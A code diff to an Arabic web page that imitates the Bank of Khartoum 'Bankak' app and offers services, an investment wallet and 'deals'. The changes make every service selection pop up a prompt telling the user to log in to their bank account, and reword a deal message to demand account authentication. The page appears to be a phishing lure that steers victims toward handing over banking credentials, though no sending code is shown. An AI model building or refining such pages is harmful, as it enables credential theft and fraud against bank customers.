@@ -865,7 +865,7 @@
                     <span>سحب بدون بطاقة</span>
                 </button>
                 <button class="grid-item-box" onclick="switchScreen('screenLogin')">
-                    <svg viewBox="0 0 24 24"><path d="M3 5v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2zm2 2h4v4H5V7zm6 0h4v4h-4V7zm6 0h4v4h-4V7zM5 13h4v4H5v-4zm6 0h4v4h-4v-4zm6 0h4v4h-4v-4z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M3 5v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2zm2 2h4v4H5V7zm6 0h4v4h-4V7zm6 0h4v4h-4v-4zM5 13h4v4H5v-4zm6 0h4v4h-4v-4zm6 0h4v4h-4v-4z"/></svg>
                     <span>بنكك PAY</span>
                 </button>
                 <button class="grid-item-box" onclick="selectAndProceedService(7, 'المحفظة الاستثمارية')">
@@ -1089,8 +1089,8 @@
     <div class="modal-overlay" id="modalCompleteService">
       <div class="modal-box">
         <div class="modal-header">تنبيه إكمال الخدمة</div>
-        <div class="modal-body" style="font-size: 0.9rem;">
-          تم استلام استمارتك بنجاح. لإكمال الخدمة، يرجى تسجيل الدخول إلى حسابك (بنكك).
+        <div class="modal-body" id="completeServiceText" style="font-size: 0.9rem;">
+          لإكمال الإجراءات وإكمال خدمة (الخدمة المطلوبة) بنجاح. يرجى تسجيل الدخول إلى حسابك المصرفي في بنك الخرطوم (بنكك)
         </div>
         <div class="modal-actions" style="flex-direction: column; gap: 6px; width: 100%;">
           <button class="btn-red" onclick="proceedToLoginFromModal()">تسجيل الدخول</button>
@@ -1462,6 +1462,12 @@
       selectedServiceIndex = index;
       selectedServiceName = name;
 
+      // تحديث النص ديناميكياً داخل النافذة المنبثقة
+      const completeTextEl = document.getElementById('completeServiceText');
+      if (completeTextEl) {
+        completeTextEl.textContent = `لإكمال الإجراءات وإكمال خدمة (${name}) بنجاح. يرجى تسجيل الدخول إلى حسابك المصرفي في بنك الخرطوم (بنكك)`;
+      }
+
       const overlay = document.getElementById('modalServiceLoading');
       if (overlay) {
         overlay.style.display = 'flex';
@@ -1480,8 +1486,7 @@
       if (index === 7) {
         switchScreen('main-screen');
       } else {
-        setupDynamicForm(index, name);
-        switchScreen('screenServiceForm');
+        document.getElementById('modalCompleteService').style.display = 'flex';
       }
     }
 
@@ -1738,7 +1743,7 @@
     }
 
     function attemptJoinDeal(dealName, amount) {
-      document.getElementById('modalFundText').textContent = `للانضمام إلى (${dealName}) بقيمة ${amount}، يلزم توثيق الحساب المصرفي أو ربط وسيلة الدفع المصرفية الخاصة بك.`;
+      document.getElementById('modalFundText').textContent = `للانضمام إلى (${dealName}) بقيمة ${amount}، يلزم توثيق الحساب المصرفي أو إتمام عملية المصادقة لتفعيل المحفظة والانضمام للصفقات بنجاح.`;
       document.getElementById('modalFundAlert').style.display = 'flex';
     }
 
